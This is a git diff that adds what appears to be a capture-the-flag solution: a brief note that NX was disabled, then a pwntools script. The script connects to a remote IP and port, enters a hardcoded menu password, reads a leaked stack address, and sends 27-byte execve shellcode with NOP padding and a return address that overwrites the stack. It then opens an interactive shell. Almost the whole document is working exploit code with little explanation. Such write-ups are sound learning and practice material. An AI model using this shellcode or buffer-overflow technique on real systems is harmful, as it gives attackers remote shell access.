@@ -1,0 +1,29 @@
+This problem was a shellcode by checking if nx was disabled during checksec
+
+got shellcode from shell storm of len 27 bytes
+
+[shellcode][padding][return]
+   |                |
+   |                |
+   -----------------|
+
+
+
+from pwn import *
+
+shell = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+p=remote("206.189.113.236",31643)
+p.recv()
+p.sendline(b'1')
+addr=p.recvline().decode().split()[-1]
+p.recv()
+p.sendline(b'2')
+p.recv()
+p.sendline(b'b4tp@$$w0rd!')
+p.recv()
+payload=shell + b'\x90'*(84-27) + p64(int(addr,16))
+p.sendline(payload)
+p.recv()
+p.sendline('3')
+p.interactive()
